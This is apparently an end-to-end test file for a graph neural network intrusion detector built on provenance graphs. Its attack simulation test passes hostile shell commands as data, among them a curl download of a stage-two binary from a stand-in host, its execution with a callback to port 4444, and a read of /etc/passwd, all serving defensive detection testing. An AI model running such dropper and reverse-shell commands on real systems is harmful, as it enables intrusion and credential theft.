import sys
import time
from pathlib import Path

# Add project root to sys.path
BASE_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(BASE_DIR))

import torch
import numpy as np
from torch_geometric.data import HeteroData

from koton.config import (
    NODE_TYPES,
    CANONICAL_EDGE_TYPES,
    PROCESS_FEAT_DIM,
    FILE_FEAT_DIM,
    SOCKET_FEAT_DIM,
    GNN_HIDDEN_CHANNELS,
)
from koton.data.schema import (
    ProcessNode,
    FileNode,
    SocketNode,
    ProvenanceEvent,
    build_hetero_data,
)
from koton.data.audit_parser import LinuxAuditParser
from koton.data.generator import SyntheticDarpaTcGenerator
from koton.data.temporal_split import slice_temporal_windows, split_chronological, evaluate_detection_metrics
from koton.models.hetero_gnn import HeteroProvenanceGNN, HeteroRGCNProvenanceGNN, create_provenance_gnn, extract_kill_chain_attention
from koton.models.loss import FocalLoss
from koton.pipeline.streaming_engine import StreamingProvenanceEngine
from koton.pipeline.detector import RealTimeGNNAnomalyDetector
from koton.attacks.attack_scenarios import AttackSimulator
from koton.web.server import app


def test_schema_and_features():
    print("[*] Running test_schema_and_features...")
    p = ProcessNode(key="proc:100:sh", pid=100, name="sh", cmdline="/bin/sh", path="/bin/sh", uid=0)
    p_feat = p.extract_features()
    assert len(p_feat) == PROCESS_FEAT_DIM, f"Expected {PROCESS_FEAT_DIM}, got {len(p_feat)}"
    assert p_feat[0] == 1.0  # Root UID

    f = FileNode(key="file:/etc/passwd", path="/etc/passwd")
    f_feat = f.extract_features()
    assert len(f_feat) == FILE_FEAT_DIM, f"Expected {FILE_FEAT_DIM}, got {len(f_feat)}"
    assert f_feat[0] == 1.0  # Sensitive path

    s = SocketNode(key="sock:198.51.100.42:4444", ip="198.51.100.42", port=4444)
    s_feat = s.extract_features()
    assert len(s_feat) == SOCKET_FEAT_DIM, f"Expected {SOCKET_FEAT_DIM}, got {len(s_feat)}"
    assert s_feat[3] == 1.0  # Reverse shell port 4444
    print("    [+] test_schema_and_features PASSED.")


def test_hetero_graph_construction():
    print("[*] Running test_hetero_graph_construction...")
    procs = {"proc:1": ProcessNode("proc:1", 1, "init", "/init", "/init", 0)}
    files = {"file:test": FileNode("file:test", "/test")}
    socks = {"sock:1": SocketNode("sock:1", "127.0.0.1", 80)}
    events = [
        ProvenanceEvent(1.0, "process", "proc:1", "read", "file", "file:test"),
        ProvenanceEvent(2.0, "process", "proc:1", "connect", "socket", "sock:1"),
    ]
    data = build_hetero_data(procs, files, socks, events)
    assert isinstance(data, HeteroData)
    assert data["process"].x.shape[0] == 1
    assert data["file"].x.shape[0] == 1
    assert data["socket"].x.shape[0] == 1
    assert ("process", "read", "file") in data.edge_types
    assert ("process", "connect", "socket") in data.edge_types
    print("    [+] test_hetero_graph_construction PASSED.")


def test_models_forward_and_loss():
    print("[*] Running test_models_forward_and_loss...")
    metadata = (NODE_TYPES, CANONICAL_EDGE_TYPES)
    hgt_model = create_provenance_gnn(arch="hgt", metadata=metadata)
    rgcn_model = create_provenance_gnn(arch="rgcn", metadata=metadata)

    # Dummy batch
    procs = {"proc:1": ProcessNode("proc:1", 1, "init", "/init", "/init", 0, label=0)}
    files = {"file:1": FileNode("file:1", "/etc/passwd", label=1)}
    socks = {"sock:1": SocketNode("sock:1", "10.0.0.1", 4444, label=1)}
    events = [ProvenanceEvent(1.0, "process", "proc:1", "read", "file", "file:1", is_attack=True)]
    data = build_hetero_data(procs, files, socks, events)

    # HGT forward
    hgt_probs = hgt_model.predict_probabilities(data)
    assert "process" in hgt_probs and "file" in hgt_probs and "socket" in hgt_probs
    assert 0.0 <= hgt_probs["process"][0].item() <= 1.0

    # RGCN forward
    rgcn_probs = rgcn_model.predict_probabilities(data)
    assert "process" in rgcn_probs and "file" in rgcn_probs
    assert 0.0 <= rgcn_probs["process"][0].item() <= 1.0

    # Focal Loss
    criterion = FocalLoss(alpha=0.85, gamma=2.0)
    dummy_logits = torch.tensor([2.5, -3.0])
    dummy_targets = torch.tensor([1, 0])
    loss = criterion(dummy_logits, dummy_targets)
    assert loss.item() > 0.0
    print("    [+] test_models_forward_and_loss PASSED.")


def test_linux_audit_parser():
    print("[*] Running test_linux_audit_parser...")
    parser = LinuxAuditParser()

    # Syscall 59: execve
    exec_line = 'type=SYSCALL msg=audit(1700000001.234:101): arch=c000003e syscall=59 success=yes exit=0 ppid=1024 pid=2048 auid=1000 uid=1000 comm="sh" exe="/bin/sh"'
    ev1 = parser.parse_line(exec_line)
    assert ev1 is not None
    assert ev1.relation == "exec"
    assert ev1.dst_key == "proc:2048:sh"

    # Syscall 42: connect
    net_line = 'type=SYSCALL msg=audit(1700000002.345:102): arch=c000003e syscall=42 success=yes exit=0 ppid=2048 pid=2048 auid=1000 uid=1000 comm="curl" exe="/usr/bin/curl" saddr=0200115C7F0000010000000000000000'
    ev2 = parser.parse_line(net_line)
    assert ev2 is not None
    assert ev2.relation == "connect"
    assert ev2.dst_type == "socket"
    print("    [+] test_linux_audit_parser PASSED.")


def test_attack_simulation_and_causal_killchain():
    print("[*] Running test_attack_simulation_and_causal_killchain...")
    engine = StreamingProvenanceEngine()
    sim = AttackSimulator(engine=engine)

    # Execute 4 stages
    r1 = sim.execute_command("whoami && id")
    assert "Reconnaissance" in r1["stage"]

    r2 = sim.execute_command("cat /etc/passwd")
    assert "Credential Dumping" in r2["stage"]

    r3 = sim.execute_command("curl -s http://198.51.100.42:8080/stage2.elf -o /tmp/stage2.elf")
    assert "Dropper" in r3["stage"]

    r4 = sim.execute_command("chmod +x /tmp/stage2.elf && /tmp/stage2.elf --connect 198.51.100.42:4444")
    assert "Privilege Escalation" in r4["stage"]

    detector = RealTimeGNNAnomalyDetector(engine=engine)
    start_t = time.time()
    state = detector.evaluate_current_window()
    infer_time_ms = (time.time() - start_t) * 1000.0

    assert state["stats"]["anomaly_count"] > 0
    assert len(state["alerts"]) > 0
    # Millisecond detection latency
    assert infer_time_ms < 100.0, f"Inference took {infer_time_ms:.2f} ms (expected < 100ms)"

    # Check kill-chain links highlighted
    kc_links = [l for l in state["links"] if l.get("is_kill_chain")]
    assert len(kc_links) > 0, "Kill-chain links should be flagged"
    print(f"    [+] test_attack_simulation_and_causal_killchain PASSED (Latency: {infer_time_ms:.2f} ms).")


def test_flask_web_endpoints():
    print("[*] Running test_flask_web_endpoints...")
    client = app.test_client()

    # Split View
    r = client.get("/split")
    assert r.status_code == 200

    # Hub
    r = client.get("/")
    assert r.status_code == 200

    # Window 1: Victim App
    r = client.get("/app")
    assert r.status_code == 200

    # Window 2: Attacker WebShell
    r = client.get("/terminal")
    assert r.status_code == 200

    # Window 3: SOC Dashboard
    r = client.get("/dashboard")
    assert r.status_code == 200

    # API: Terminal Command Execution
    r = client.post("/api/terminal/exec", json={"command": "whoami"})
    assert r.status_code == 200
    res_data = r.get_json()
    assert "uid=" in res_data["output"]

    # API: Attack Run
    r = client.post("/api/attacks/run", json={"scenario": "dropper"})
    assert r.status_code == 200
    assert r.get_json()["status"] == "ok"

    # API: Benign Traffic
    r = client.post("/api/traffic/benign")
    assert r.status_code == 200
    assert r.get_json()["status"] == "ok"

    # API: Threshold Config
    r = client.post("/api/config/threshold", json={"threshold": 0.70})
    assert r.status_code == 200
    assert r.get_json()["threshold"] == 0.70

    # API: Graph State Snapshot
    r = client.get("/api/graph/state")
    assert r.status_code == 200
    state = r.get_json()
    assert "nodes" in state and "links" in state and "stats" in state
    print("    [+] test_flask_web_endpoints PASSED.")


if __name__ == "__main__":
    print("=" * 60)
    print("  KoTon: Real-Time GNN Provenance Intrusion Detection E2E Tests")
    print("=" * 60)
    test_schema_and_features()
    test_hetero_graph_construction()
    test_models_forward_and_loss()
    test_linux_audit_parser()
    test_attack_simulation_and_causal_killchain()
    test_flask_web_endpoints()
    print("=" * 60)
    print("  ALL END-TO-END PIPELINE TESTS PASSED SUCCESSFULLY! (100%)")
    print("=" * 60)
